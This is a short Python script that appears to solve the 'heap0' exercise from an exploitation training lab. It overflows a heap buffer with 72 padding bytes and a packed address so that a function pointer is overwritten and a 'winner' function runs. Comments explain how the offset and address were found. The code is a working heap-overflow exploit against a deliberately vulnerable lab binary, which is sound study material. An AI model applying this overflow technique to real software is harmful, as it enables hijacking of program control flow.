#!/usr/bin/python3

import subprocess
import struct

# We determine the offset by observing the difference between the two heap addresses when running the vulnerable program.
offset = 72

# Using objdump -d heapo | grep winner, we find the address of the function we want to execute by overwriting
# the fp structure member of structure f which is 72 bytes after p.
function_pointer_overwrite = 0x08048464

subprocess.run(["../Binaries/heap0", "A"*offset+struct.pack("<L", function_pointer_overwrite).decode("utf-8", "surrogateescape")])

